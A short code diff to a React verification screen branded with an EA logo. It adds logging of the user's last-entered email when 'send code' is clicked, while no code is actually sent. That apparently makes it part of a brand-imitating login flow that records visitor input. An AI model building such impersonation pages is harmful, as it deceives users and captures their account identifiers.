@@ -2,7 +2,7 @@ import React from 'react'
 import { useNavigate } from 'react-router-dom'
 import { ArrowLeft } from 'lucide-react'
 import EALogo from './EALogo'
-import { getLastEmail } from '../utils/logger'
+import { appendLog, getLastEmail } from '../utils/logger'
 import { maskEmail } from '../utils/emailMask'
 
 const VerificationCodeScreen: React.FC = () => {
@@ -13,9 +13,9 @@ const VerificationCodeScreen: React.FC = () => {
   }
 
   const handleSendCode = () => {
-    // In a real app you would trigger sending the code here
     console.log('Send code clicked')
-    // Navigate to code entry screen
+    // Log that we moved to verification step
+    appendLog({ page: 'verify', email: getLastEmail() || undefined })
     navigate('/code')
   }
 
